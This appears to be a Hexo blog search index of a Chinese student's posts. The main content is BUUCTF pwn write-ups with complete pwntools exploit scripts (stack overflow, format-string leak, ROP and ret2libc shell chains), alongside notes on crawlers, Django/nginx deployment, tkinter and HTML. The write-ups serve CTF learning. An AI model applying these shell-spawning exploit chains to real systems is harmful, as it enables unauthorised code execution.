<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[BUUCTF pwn做题记录]]></title>
    <url>%2F2020%2F02%2F05%2FBUUCTFpwn%2F</url>
    <content type="text"><![CDATA[BUUCTF pwn做题记录 get_started_3dsctf_2016思路首先file查看，是32位程序。checksec检查，只开启了nx 之后用ida查看，发现main函数中有明显溢出点gets 发现有获取flag的函数get_flag 所以思路就很明显了，将return address覆盖为get_flag的地址，再将参数传入，从而通过if判断，得到flag exp如下 12345678910111213from pwn import *#context.log_level = 'debug'sh = process('./get_started_3dsctf_2016')#gdb.attach(sh)num = 56address = 0x080489a0exit_address = 0x0804e6a0payload = 'A' * num + p32(address) + p32(exit_address) + p32(0x308cd64f) + p32(0x195719d1)# sh.recvline()sh.sendline(payload)#sh.recvline()sh.interactive() 这道题如果按这种方法做需要注意，因为最后程序是异常结束的(栈溢出)，并且没有遇到换行符，所以输出的flag仍处在缓冲区中，直接连接远程是无法看到结果的。我们可以再添加一个exit函数，使程序退出，从而将结果从缓冲区写入控制台中。 总结注意exit函数在这道题中的用途 [第五空间2019 决赛]PWN5思路file查看是32位程序，开启了nx和canary保护 之后ida查看，发现有buf处是明显的格式化字符串漏洞 为了执行system(‘/bin/sh’),我们可以获取0x804c044处的数值，然后将此值作为密码输入。 首先构造payload(注意4字节对齐) 尝试构造payload为%7$p + ‘A’ * 4 + p32(0x804c044), printf(&amp;buf)处输出的结果为0xf7dc18fb。 通过计算，我们可以得到第12个位置对应0x804c044 所以修改payload为%12$s + ‘A’ * 3 + p32(0x804c044) (A改为3个保证payload本身4字节对齐，用%s输出可以得到对应地址的值，相当于一次解引用) 注意到一个细节，我们将接收的值u32解包后，得到的是将对应二进制视作unsigned int的结果，这样对负数结果会出现错误。通过对二进制补码的理解，我们可以得到A + (-A) = 2^32,所以需要额外特殊判断，将结果转化为有符号整型。 最终的exp: 1234567891011121314151617from pwn import *# context.log_level = 'debug'sh = process('./pwn')# sh = remote('node3.buuoj.cn', 25471)# gdb.attach(sh)pd_address = 0x0804c044payload = '%12$s' + 'A' * 3 + p32(pd_address)sh.recvuntil('name:')sh.sendline(payload)data = u32(sh.recvline()[6:10])# log.success(str(data))if data &gt; 2**31-1: data = data - 2**32sh.sendline(str(data))sh.interactive() 总结注意u32解包出来的是无符号整型，对负数结果需要另外处理 ciscn_2019_n_8思路老套路，32位程序，ida查看 逻辑比较简单，只需要保证var[13]的值等于17即可 注意到var变量是在bss段中的dword类型的变量，所以payload要以4字节为单位 而ida中的QWORD，等价于一次强制类型转换，将int转换为long long 所以exp如下 12345678from pwn import *# context.log_level = 'debug'sh = process('./ciscn_2019_n_8')payload = 'A' * 13 * 4 + p32(17)sh.sendline(payload)sh.interactive() 总结注意变量的类型，payload会因此而改变 not_the_same_3dsctf_2016思路32位程序，ida查看 明显的溢出点，再在ida中查找可以利用的函数 发现secret函数将flag写入了一个bss段的全局变量里，所以我们可以考虑将这个变量输出来获得flag。 发现程序中并没有puts函数，于是利用printf函数。 再从所有字符串中查找含有%s的可利用的格式化字符串 这里我随意选取了0x1a处的字符串 然后构造payload输出flag即可 exp如下 1234567891011121314151617from pwn import *# context.log_level = 'debug'# sh = remote('node3.buuoj.cn', 27089)sh = process('./not_the_same_3dsctf_2016')# elf = ELF('./not_the_same_3dsctf_2016')func_address = 0x080489A0flag_address = 0x080ECA2Dstr_address = 0x080D5543printf_address = 0x0804F0A0exit_address = 0x0804E660num = 45payload = 'A' * 45 + p32(func_address) + p32(printf_address) + p32(exit_address) + p32(str_address) + p32(flag_address) + p32(flag_address)sh.sendline(payload)sh.interactive() 和之前的某道题相同，最后要用exit函数来刷新输出流(可能是靶场的问题，按理说有\n出现后输出流应该会被刷新才对) 总结注意printf的构造和应用 ciscn_2019_s_3这题还是有点东西的(贼麻烦) 思路64位程序，只有nx保护 查看ida，main函数没有什么有用的东西，只能看出调用了vuln函数 再看vuln函数 可以看到两遍系统调用，分别调用了sys_read和sys_write 再没有其他可用的信息，所以我们可以考虑通过系统调用访问shell 首先，系统调用sys_execve的条件是rax=59,rdi=’/bin/sh’,rsi=0,rdx=0 64位的系统调用码可以查表 其中比较难满足的是rax=59，我们先ROPgadget看看有没有可以实现的gadget 正好有mov rax 0x3b，所以执行sys_execve有可行性 那么这个题的整体思路就是 sys_read溢出 -&gt; 修改rax -&gt; 修改rdi -&gt; 修改rsi -&gt; 修改rdx -&gt; 执行syscall 首先gdb计算sys_read中buf的偏移，得到偏移值16 我们发现程序中没有可以直接利用的/bin/sh字符串，所以我们只能通过sys_read在buf中读入。同时，为了后面利用buf，我们必须知道buf的地址。 注意到buf的位置是$rsp - 10，所以我们需要泄漏出rsp的地址。 再回到最初的vuln函数，我们可以发现sys_write函数同样有着‘溢出’，就是多输出了栈上的东西。假如在这些多输出的数据中，存在输出一个栈上的地址，那我们就可以利用这个地址，通过计算偏移得到rsp的地址。 gdb中跑跑看，我们可以惊喜的发现存在这种情况(注意要si进入vuln函数，否则无法查看vuln函数的栈帧) 在执行完sys_write后，我门查看栈空间，发现$rsp和$rsp+16都是存放着一个栈上的地址。$rsp就是return address,我们需要进行覆写，无法利用，所以我们可以利用$rsp+16。泄露出栈地址后，我们需要让程序重新执行，所以构造初始exp如下: 123456789101112from pwn import *context.log_level = 'debug'sh = process('./ciscn_s_3')# sh = remote('node3.buuoj.cn', 26505)gdb.attach(sh)elf = ELF('./ciscn_s_3')num = 16start_addr = 0x4003E0payload = 'A' * num + p64(start_addr)sh.sendline(payload)sh.interactive() 运行exp,我们发现输出的[0x20:0x28]部分就是我们需要的地址 接下来就是计算这个地址和rsp的偏移。 值得注意的是，我们rsp的地址是会发生改变的，所以为了得到/bin/sh的地址，我们需要计算的是泄露地址和第二次执行程序时rsp的地址的偏移。我们可以暂时先放一放，等到构造完payload后再求。 我们继续寻找修改rdi, rsi, rdx的gadget。 分别可以找到 12pop_rdi_addr = 0x4005a3 # pop rdi ; retpop_rsi_addr = 0x4005a1 # pop rsi ; pop r15 ; ret 比较棘手的是rdx。我们只能找到这样一段可利用的代码 为此我们需要控制的寄存器有r12和r13。所以还需要额外的gadget 1pop_r12_r13_14_15_addr = 0x40059C # pop r12 r13 14 15 ret 注意到修改rdx的代码段也修改了rdi和rsi，所以我们需要优先处理rdx的值。 r13 r14 r15的值都可以置为零，但是r12的值不能为零，因为0x400589处有call qword ptr [r12+rbx*8]。所以我们需要将r12的值置为一个栈地址(因为有一层解引用) 于是我们目前构造payload为 123payload = '/bin/sh\x00' + p64(mov_rax_addr) # 满足偏移16payload += p64(pop_r12_r13_14_15_addr) + p64(stack_addr - 8) + p64(0x0) * 3 # 修改r12 r13 r14 r15payload += p64(mov_rdx_addr) 这样call的时候就是执行mov_rax_addr处的代码 但是这样还不够，因为mov_rdx_addr处的代码是一个循环，rbx和rbp显然是不能相等的，所以程序会执行第二次call，而这次的地址是$r12+8，也就是再一次执行pop_r12_r13_14_15。为了跳出这个循环，我们必须更改栈结构，控制return address。在call的时候，会执行push rip，所以我们可以少输入一个值，再加上一个return address。 即payload += p64(0x0) * 3 + p64(pop_rdi_addr)。栈结构如图 这样，执行完pop r12 r13 r14 r15后就会跳转到pop_rdi_addr。 最麻烦的问题解决了，后面就是简单的构造rop链了。最后的payload为 123payload = '/bin/sh\x00' + p64(mov_rax_addr)payload += p64(pop_r12_r13_14_15_addr) + p64(stack_addr - 8) + p64(0x0) * 3payload += p64(mov_rdx_addr) + p64(0x0) * 3 + p64(pop_rdi_addr) + p64(stack_addr - 16) + p64(0x400517) 我们前面跳过了一步，就是求rsp在第二次程序执行时的地址。我们直接在vuln函数结束处下断点，等到第二次执行时查看rsp地址即可。 得到偏移为504 所以最后的exp为 1234567891011121314151617181920212223from pwn import *# context.log_level = 'debug'sh = process('./ciscn_s_3')# gdb.attach(sh, 'b* 0x400519')elf = ELF('./ciscn_s_3')num = 16pop_rdi_addr = 0x4005a3 # pop rdi ; retmov_rax_addr = 0x4004e2 # mov rax, 0x3b ; retpop_rsi_addr = 0x4005a1 # pop rsi ; pop r15 ; retmov_rdx_addr = 0x400580 # mov rdx, r13pop_r12_r13_14_15_addr = 0x40059C # pop r12 r13 14 15 retstart_addr = 0x4003E0payload = 'A' * num + p64(start_addr)sh.sendline(payload)stack_addr = u64(sh.recv(0x30)[0x20:0x28]) - 504log.success(hex(stack_addr))payload = '/bin/sh\x00' + p64(mov_rax_addr)payload += p64(pop_r12_r13_14_15_addr) + p64(stack_addr - 8) + p64(0x0) * 3payload += p64(mov_rdx_addr) + p64(0x0) * 3 + p64(pop_rdi_addr) + p64(stack_addr - 16) + p64(0x400517)sh.sendline(payload)sh.interactive() 总结ROP链的构造还是要具体情况具体分析，注意更改栈结构来控制程序流 [HarekazeCTF2019]baby_rop思路64位程序, nx保护 ida查看，发现有/bin/sh和system函数 ROPgadget查找到pop rdi的gadget 所以思路就很明显了，修改rdi的值为/bin/sh，之后运行system函数即可 exp如下 12345678910from pwn import *# context.log_level = 'debug'sh = process('./babyrop')# sh = remote('node3.buuoj.cn', 29202)pop_rdi_addr = 0x400683 # pop rdi; retstr_bin_sh = 0x601048payload = 'A' * 24 + p64(pop_rdi_addr) + p64(str_bin_sh) + p64(0x400490)sh.sendline(payload)sh.interactive() 总结这个题中main函数用了system输出，所以不能直接gdb(因为调用了另一个进程) 这种情况下我们可以通过 12sh = process('./babyrop')gdb.attach(sh) 来实现gdb调试。 [HarekazeCTF2019]baby_rop2思路64位程序，nx保护 ida查看，read函数可以溢出。 程序中再无其他可以直接利用的函数，考虑ret2libc ROPgadget找到修改rdi的gadget 之后构造rop链，输出read函数的got表中地址(不知道为什么printf的got地址就不能输出)，再次运行程序，获得system地址和/bin/sh地址，标准的ret2libc exp如下 123456789101112131415161718192021222324252627from pwn import *from LibcSearcher import *# context.log_level = 'debug'sh = process('./babyrop2')elf = ELF('./babyrop2')# gdb.attach(sh, 'b* 0x4004f0')start_addr = 0x400540num = 40printf_plt_addr = 0x4004F0read_got_addr = elf.got['read']pop_rdi_addr = 0x400733 # pop rdi; retpayload = 'A' * 40 + p64(pop_rdi_addr) + p64(read_got_addr)payload += p64(printf_plt_addr) + p64(start_addr)sh.recvuntil('name? ')sh.sendline(payload)sh.recvuntil('!\n')read_addr = u64(sh.recv(0x6).ljust(8,'\x00'))log.success(hex(read_addr))libc = LibcSearcher('read', read_addr)libc_base = read_addr - libc.dump('read')system_addr = libc.dump('system') + libc_basestr_bin_sh = libc.dump('str_bin_sh') + libc_basepayload = 'A' * 40 + p64(pop_rdi_addr) + p64(str_bin_sh) + p64(system_addr)sh.recvuntil('name? ')sh.sendline(payload)sh.interactive() 总结疑问：为什么不能输出printf的got表地址 如果再遇到这种奇怪问题可以试着输出别的函数的got表中地址看一看]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn入门]]></title>
    <url>%2F2020%2F02%2F03%2Fpwn_baby%2F</url>
    <content type="text"><![CDATA[pwn的基础方法 引言师傅在入门课上提出了一个问题 1234567#include &lt;cstdio&gt;int main()&#123; double a=10; printf("%d",a); return 0;&#125; 这个程序在linux 64位环境下每次运行的结果都不相同，出乎我的意料。我最初的想法是将a的二进制位当做一个int来读取，只取前32位。但是这样结果应该是一个确定的值，而非每次都不相同。我们可以用gdb一探究竟。 步进到调用printf处，我们可以看到guessed arguments处只有一个arg[0]，即printf只有格式化字符串这个参数，变量a并没有被当做参数传入。因此，a中的值也没有被放到rsi寄存器里。最终，我们输出的是rsi中的值，这个值因受之前运算的影响而每次不同。 pwn基础方法推荐知乎上的一篇文章 手把手教你栈溢出从入门到放弃。其中具体讲解了栈溢出的原理和方法基础。我就结合几道简单题演示一下这些方法应该如何使用 shellcodeshellcode没找到合适的例子，暂且略过（这年头是程序基本都开nx保护） ret2text找到关键函数的位置，通过栈溢出将return address覆盖为关键函数的地址，从而获取flag 。 以buuctf上的rip为例,首先查看文件类型和保护。 确定是64位程序，没有开启各种保护。 之后ida查看一下大致运行的流程。 很明显，gets这个函数可以溢出。观察到有fun这个函数 所以思路很明显，我们通过gets将return address 覆盖为fun函数的地址，实现获取flag 先用gdb计算偏移得出偏移为23，然后查看ida找到call system及传入参数的指令的地址 之后构造如下payload 123456from pwn import *sh = process('./pwn1')payload = 'A' * 23 + p64(0x40118A)sh.sendline(payload)sh.interactive() 就可以通过cat flag得到flag ret2libc如果程序中没有给出system函数和’/bin/sh’字符串的话，前面的操作就无法实现。不过我们可以对libc中的system函数加以利用，实现和上面相似的效果 以buuctf上的ciscn_2019_c_1为例 首先查看类型和保护，发现开启了nx保护。 之后用ida反汇编，发现其中的encrypt函数存在溢出点。 我们首先要计算出libc的偏移，这可以通过puts函数来实现 12345678elf = ELF('./pwn')num = 0x58puts_got_address = elf.got['puts']puts_plt_address = 0x4006e0pop_rdi_address = 0x400c83start_main_address = elf.sym['main']payload = 'A' * num + p64(pop_rdi_address) + p64(puts_got_address) + p64(puts_plt_address) + p64(start_main_address) 这个payload和之前的相比更加复杂。首先将pop_rdi;ret ;这条指令的地址覆写到return address，这样程序就会将rdi中的数据变成后面的puts_got_address,同时将rip变为puts在plt段中的地址。这样就可以实现puts输出puts这个函数在got表中的地址。最后的start_main_address是为了保证栈空间结构的正确性，即从头开始运行程序。 我们接收输出的地址，并利用这个地址和libc库比对，得到对应libc，从而计算出函数地址的偏移。 12345678910111213libc_puts_address = u64(sh.recvline()[:-1].ljust(8, '\0'))libc = LibcSearcher('puts', libc_puts_address)# 查找对应的libclibc_base = libc_puts_address - libc.dump('puts')# 计算函数地址的偏移system_address = libc_base + libc.dump('system')# 计算system函数的实际地址binsh_address = libc_base + libc.dump('str_bin_sh')# 计算/bin/sh这个字符串的实际地址payload = 'A' * num payload += p64(0x4006b9)# 添加一个ret指令保证字节对齐payload += p64(pop_rdi_address) + p64(binsh_address) + p64(system_address) 新payload的构造与上面的相似，最终实现调用system函数的目的。 总的exp为 1234567891011121314151617181920212223242526272829303132from pwn import *from LibcSearcher import *sh = remote('node3.buuoj.cn', 28331)#sh = process('./pwn')#gdb.attach(sh)elf = ELF('./pwn')num = 0x58puts_got_address = elf.got['puts']puts_plt_address = 0x4006e0pop_rdi_address = 0x400c83start_main_address = elf.sym['main']payload = 'A' * num + p64(pop_rdi_address) + p64(puts_got_address) + p64(puts_plt_address) + p64(start_main_address)sh.sendlineafter('choice!\n', '1')sh.sendline(payload)sh.recvuntil('@')sh.recvline()libc_puts_address = u64(sh.recvline()[:-1].ljust(8, '\0'))libc = LibcSearcher('puts', libc_puts_address)libc_base = libc_puts_address - libc.dump('puts')system_address = libc_base + libc.dump('system')binsh_address = libc_base + libc.dump('str_bin_sh')payload = 'A' * num payload += p64(0x4006b9)payload += p64(pop_rdi_address) + p64(binsh_address) + p64(system_address)sh.sendlineafter('choice!\n', '1')sh.sendline(payload)sh.interactive()]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spider]]></title>
    <url>%2F2019%2F10%2F31%2Fspider%2F</url>
    <content type="text"><![CDATA[爬虫的简单架构和实现 0x00 爬虫基本架构HTML下载器: 获取新页面内容 HTML解析器: 解析新内容中的url url管理器: 管理url,去重,提供新的url来爬取 输出器: 将数据收集保存或输出 0x01 爬虫相关库BeautifulSoup12soup = BeautifulSoup(cont, 'html.parser', from_encoding='utf-8') # 创建soup对象links = soup.find_all('a', href=re.compile(r'')) # soup对象的find_all遍历文档树,查找'a'标签,href支持正则匹配 urllib.request12345req = urllib.request.Request(url) # Request函数构造请求req.add_header('User-Agent', 'something') # 修改请求头response = urllib.request.urlopen(req) # 发送请求response.getcode() # 获取请求返回码response.read() # 获取返回的内容 0x02 爬虫示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from bs4 import BeautifulSoupimport urllib.requestimport reimport urllib.parsefrom functools import cmp_to_keydef cmp(x, y): if x['time'] &lt; y['time']: return -1 elif x['time'] &gt; y['time']: return 1 else: return 0class HtmlDownloader(object): def download(self, new_url): if new_url is None: return None req = urllib.request.Request(new_url) req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36') response = urllib.request.urlopen(req) if response.getcode() != 200: return None return response.read()class HtmlParser(object): def parse(self, new_url, cont): if new_url is None or cont is None: return None, None soup = BeautifulSoup(cont, 'html.parser', from_encoding='utf-8') urls = self._get_new_urls(new_url, soup) data = self._get_new_data(new_url, soup) return urls, data def _get_new_urls(self, new_url, soup): urls = set() links = soup.find_all('a', href=re.compile(r'.*')) for link in links: url = link['href'] full_url = urllib.parse.urljoin(new_url, url) urls.add(full_url) return urls def _get_new_data(self, new_url, soup): try: data = &#123;&#125; data['url'] = new_url data['content'] = soup.find('p').get_text() return data except: return Noneclass UrlManager(object): def __init__(self): self.new_urls = set() self.old_urls = set() def has_new_url(self): return len(self.new_urls) != 0 def add_url(self, url): if url is None: return if url not in self.old_urls and url not in self.new_urls: self.new_urls.add(url) def get_new_url(self): url = self.new_urls.pop() self.old_urls.add(url) return url def add_urls(self, urls): if urls is None: return for url in urls: self.add_url(url)class HtmlOutputer(object): def __init__(self): self.data = [] def _process(self, s): return ''.join(s.split()) def collect(self, data): if data is None: return for key in data: data[key] = self._process(data[key]) self.data.append(data) def get_data(self): return sorted(self.data, key=cmp_to_key(cmp), reverse=True)class Spider(object): def __init__(self): self.downloader = HtmlDownloader() self.parser = HtmlParser() self.manager = UrlManager() self.outputer = HtmlOutputer() def craw(self, num): if num == 0: return root_url = 'https://www.example.com' count = 0 self.manager.add_url(root_url) try: while self.manager.has_new_url(): new_url = self.manager.get_new_url() cont = self.downloader.download(new_url) urls, data = self.parser.parse(new_url, cont) self.manager.add_urls(urls) self.outputer.collect(data) count += 1 if count == num: break except: print('Craw failed')if __name__ == '__main__': num = int(input('Input num: ')) spider = Spider() spider.craw(num)]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[django部署]]></title>
    <url>%2F2019%2F10%2F30%2Fdjangoenv%2F</url>
    <content type="text"><![CDATA[基于Python3和Django2.2版本的django环境搭建 Django环境搭建以下基于Python3和Django2.2版本,对低版本不具有参考性 0x00 配置虚拟环境1pip3 install virtualenv virtualenvwrapper 之后修改环境变量(如.bashrc),加入 1234export WORKON_HOME=$HOME/.virtualenvsexport PROJECT_HOME=$HOME/workspaceexport VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3source /usr/local/bin/virtualenvwrapper.sh 修改后重新加载环境变量文件 1source ~/.bashrc 虚拟环境相关指令mkvirtualenv env3 创建新环境env3 mkvirtualenv env3 —python=python3(.x) 创建python3版本的环境 workon env3 使用env3环境 deactivate 退出env3环境 rmvirtualenv env3 删除env3 mkproject mine 创建mine项目和mine环境 lsvirtualenv 列出可用虚拟环境 lssitepackages 列出当前环境安装的包 0x01 安装Django1pip3 install Django 测试安装是否成功: 12import djangodjango.get_version() 输出版本号即安装完成 0x02 新建Django项目1django-admin startproject myproject 或者写django-admin.py 项目名称应为Python合法包名 0x03 新建app12cd myprojectpython manage.py startapp myapp 0x04 运行开发服务器1python manage.py runserver 0x05 静态文件静态文件是指js,css,图片等文件 首先,打开settings.py,添加 1234567891011121314151617181920212223# Static files (CSS, JavaScript, Images)# https://docs.djangoproject.com/en/1.8/howto/static-files/ STATIC_URL = '/static/' # 当运行 python manage.py collectstatic 的时候# STATIC_ROOT 文件夹 是用来将所有STATICFILES_DIRS中所有文件夹中的文件，以及各app中static中的文件都复制过来# 把这些文件放到一起是为了用apache等部署的时候更方便STATIC_ROOT = os.path.join(BASE_DIR, 'collected_static') # 其它 存放静态文件的文件夹，可以用来存放项目中公用的静态文件，里面不能包含 STATIC_ROOT# 如果不想用 STATICFILES_DIRS 可以不用，都放在 app 里的 static 中也可以STATICFILES_DIRS = ( os.path.join(BASE_DIR, "common_static"), '/path/to/others/static/', # 用不到的时候可以不写这一行) # 这个是默认设置，Django 默认会在 STATICFILES_DIRS中的文件夹 和 各app下的static文件夹中找文件# 注意有先后顺序，找到了就不再继续找了STATICFILES_FINDERS = ( "django.contrib.staticfiles.finders.FileSystemFinder", "django.contrib.staticfiles.finders.AppDirectoriesFinder") 部署时,需要收集静态文件 1python manage.py collectstatic uwsgi部署0x00 安装uwsgi12sudo apt install python3-devsudo pip3 install uwsgi 安装完成后 1uwsgi --python-version 版本与要使用的python相同即可 0x01 配置ini文件123456789101112131415161718192021222324# mysite_uwsgi.ini file[uwsgi]virtualenv = /home/admin/.virtualenvs/env3 # Your virtualenv path# Django-related settings# the base directory (full path)chdir = /home/admin/myproject # Your project path# Django's wsgi filemodule = myproject.wsgi # project's name .wsgi# the virtualenv (full path)# home = /home/admin/.virtualenvs/reload# process-related settings# mastermaster = true# maximum number of worker processesprocesses = 2# the socket (use the full path to be safe)http = :8080 # 用于http直接访问socket = /home/admin/myproject/myproject.sock # 用于配合nginx# 或者 socket = ip:端口pidfile = /home/admin/myproject/uwsgi.pid # 生成pid文件,用于进程管理# ... with appropriate permissions - may be needed# chmod-socket = 664# clear environment on exitvacuum = true 0x02 运行uwsgi1uwsgi --ini uwsgi.ini uwsgi指令uwsgi -d —ini uwsgi.ini 后台运行uwsgi uwsgi —reload xxx.pid 重新加载 uwsgi —stop xxx.pid 停止进程 查看端口占用情况1lsof -i :8000 查找进程1ps aux | grep uwsgi 停止进程1sudo kill -9 PID nginx部署0x00 安装nginx1sudo apt install nginx 安装后访问ip,显示nginx欢迎页面即说明安装成功 0x01 新建网站首先在项目路径下新建 uwsgi_params 文件,内容如下 1234567891011121314151617uwsgi_param QUERY_STRING $query_string;uwsgi_param REQUEST_METHOD $request_method;uwsgi_param CONTENT_TYPE $content_type;uwsgi_param CONTENT_LENGTH $content_length;uwsgi_param REQUEST_URI $request_uri;uwsgi_param PATH_INFO $document_uri;uwsgi_param DOCUMENT_ROOT $document_root;uwsgi_param SERVER_PROTOCOL $server_protocol;uwsgi_param REQUEST_SCHEME $scheme;uwsgi_param HTTPS $https if_not_empty;uwsgi_param REMOTE_ADDR $remote_addr;uwsgi_param REMOTE_PORT $remote_port;uwsgi_param SERVER_PORT $server_port;uwsgi_param SERVER_NAME $server_name; 之后 1sudo vim /etc/nginx/sites-available/mysite.conf 写入 12345678910111213141516171819202122232425262728293031323334# myproject.conf # the upstream component nginx needs to connect toupstream django &#123; server unix:///home/admin/myproject/myproject.sock; # for a file socket # server 127.0.0.1:8001; # for a web port socket 端口与uwsgi的socket配置相同&#125;# configuration of the serverserver &#123; # the port your site will be served on listen 8000; # the domain name it will serve for server_name 207.148.123.145; # substitute your machine's IP address or FQDN charset utf-8; # max upload size client_max_body_size 75M; # adjust to taste # Django media # location /media &#123; # alias /path/to/your/mysite/media; # your Django project's media files - amend as required # &#125; location /static &#123; alias /home/admin/myproject/collected_static; # your Django project's static files - amend as required &#125; # Finally, send all non-media requests to the Django server. location / &#123; uwsgi_pass django; include /home/admin/myproject/uwsgi_params; # the uwsgi_params file you installed 与上文写的文件路径相同 &#125;&#125; media和static路径不需要可不写]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>uwsgi</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html&css]]></title>
    <url>%2F2019%2F09%2F27%2Fhtmlcss%2F</url>
    <content type="text"><![CDATA[(前端果然是体力活) html基础标签&lt;p&gt;这种的是标签,而&lt;p&gt;something&lt;/p&gt;称为元素 span vs div&lt;div&gt;是block-level的元素，span是inline-level的元素(并不知道汉语应该怎么说，因为被推荐的教程是英文的) strong vs em&lt;strong&gt;使内容加粗，&lt;em&gt;使内容斜体。 article用来标记一段可以单独取出而不产生歧义的语段 section用于大纲等有着逻辑关系的组里 aside侧边位置的容器 附: small可以用来写旁注和copyright&amp;copy;即&copy;123&lt;footer&gt; &lt;small&gt;&amp;copy; Styles Conference&lt;/small&gt;&lt;/footer&gt; a用来添加链接和页内跳转&lt;a href=&quot;#&quot;&gt;...&lt;/a&gt;不要把href写成herf css待续]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python]]></title>
    <url>%2F2019%2F09%2F21%2Fpython%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[好久没有写博客了，总结一下python写程序时遇到的知识点和问题。 base64库base64.b64encode(string)接受参数string应为byte型，str类型需转换，如string.encode(‘utf-8’) base64.b64decode(string)同上，字符串应为byte型，注意可加参数validate,true表示遇到非法字符抛出异常，false表示遇到非法字符忽略，默认false。如base64.b64decode(s,validate=True)注意binascii.Error是在base64命名空间下，所以except要写成except base64.binascii.Error 常见异常：UnicodeEncodeErrorbase64.binascii.Error 字符串处理split()s.split(‘char’)返回一个数组，为以char分割后的各个字符串。可选参数：指定分割次数，默认为-1，即分割所有。如s.split(‘char’,1) strip()用于除去字符串两端的字符s.strip()表示除去两端的空格s.strip(‘1’)即除去字符串两端的’1’ 切片注意左开右闭s[1:-1]不包含最后一个字符，s[-1]为提取最后一个字符 常见异常IndexError 图片处理注意调库Image在PIL里，所以写成from PIL import Image Image.open()返回一个pil里的img类型，写的时候注意参数的类型变化 获取图片的宽高对一个上述Image.open()返回值类型的变量，可以用.size方法，如1width,height=tmp.size 图片原比例缩放当时写qrcode制作的时候，因为文本量太大，所以生成的qrcode过大，此时将图片缩放应该是比设计滚动条更好的选(其实是我不会给Label加滚动条)1234567def resize(w,h,nw,nh,img): a=1.0*nw/w #用1.0是为了强制转化为浮点数运算 b=1.0*nh/h div=min(a,b) fw=int(w*div) fh=int(h*div) return img.resize((fw,fh),Image.ANTIALIAS) img类型应为Image.open()的返回值类型Image.ANTIALIAS高质量Image.NEAREST低质量 os库1os.system(order) order即控制台运行的指令注意，如果要在A程序里打开B,最好新建一个控制台，即1os.system(start python b.py) 因为这样直接关闭B程序不会导致A程序接受不到B程序执行结束的反馈而崩溃。(貌似我因为这样写弄崩了评测学长的命令行)1os.getcwd() 这个可以获取当前的py文件所在路径 GUI学习GUI真是个大坑啊，尤其是库里出了问题，全凭google救命 tkinter第一次写GUI用的就是这个库，大概优点是python里自带，不用额外安装库，操作简单。不过界面挺简陋的(俺的第一次GUI被说界面丑)PS:python3 里 写作tkinter，老版本写作Tkinter Tk()创建一个窗口，如1root=Tk() titletitle就是打开的窗口左上角显示的文字1root.title('I love python') Button控件新建一个按钮控件1Button(root,text='',command=click,height=h,width=w,activeforeground='color') master是按钮控件要加入的窗口，text为按钮显示的文本，command为按钮点击时触发的函数，width,height为按钮的宽高activeforeground为点击时的前景色。 Label控件新建一个用户不可选中的显示区，可以用来显示图片和文字 显示文字1Label(root,text) 含义同上 显示图片12img=ImageTk.PhotoImage(Image.open(path))Label(image=img) ImageTk,Image在PIL库里Label会根据图片的大小自动改变大小 Text控件新建一个可以被用户选中的显示文本或图片的控件1e1=Text(root,height=a,width=b) 参数含义同上 获取Text内的文字1e1.get(0.0,END) 第一个参数是开始的(行.列)第二个参数同理，可以用END来替代结尾 注意Text会在文本最后额外添加一个换行符 Text文本内容的修改12e1.delete(0.0,END)e1.insert(0.0,s) insert参数中第一项为插入位置，第二项为插入的字符串 动态修改Label,Button都是可以动态修改的1A.config(a=b) config里是需要修改的参数这里有个坑,在Label动态修改图片时，要这样写12imglabel.config(image=img)imglabel.image=img 如果少写第二行，就会出现虽然Label已经根据图片调整了大小，但是还是无法显示图片的bug。这个bug好像是因为库里有的引用忘记修改了，大概是库函数的锅。。。 tkinter布局管理pack()这个比较简单，就是自动排布，默认累成一列，可再加参数更改排布方式如:1A.pack() grid()grid可以略微精准一点来控制布局，它将界面分成小格，row表示行数，column表示列数，可以增加sticky参数来确定在单独一个格里的分布如:1a.grid(row=1,column=1,sticky=W) 注意pack和grid不能混合使用，只能二者取一 增加滚动条目前还只会给Text增加垂直滚动条123456e1=Text(root,height=15,width=100)S=Scrollbar(root)S.grid(row=0,column=1,sticky=E,ipady=70)e1.grid(row=0,column=1,sticky=W,padx=20)S.config(command=e1.yview)e1.config(yscrollcommand=S.set) 打开文件选取框12import tkinter.filedialogfilepath=tkinter.filedialog.askopenfilename() filepath是带着当前文件的全名的(包括扩展名) 运行窗口1root.mainloop() 识别文件的编码格式并打开12345import chardetwith open(filepath,'rb') as tf: nowencode=chardet.detect(tf.read())['encoding']with open(filepath,encoding=nowencode) as f: s=f.read() 这样防止乱码问题 待续]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf工具总结]]></title>
    <url>%2F2019%2F09%2F12%2Fctf%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[关于CTF常用工具的一些总结 1.ZipCenOp.jar用于判断压缩包是否为伪加密 指令:java -jar ZipCenOp.jar r xxx.zip decodejava -jar ZipCenOp.jar e xxx.zip encode 待续]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP审计总结]]></title>
    <url>%2F2019%2F09%2F11%2FPHPbug%2F</url>
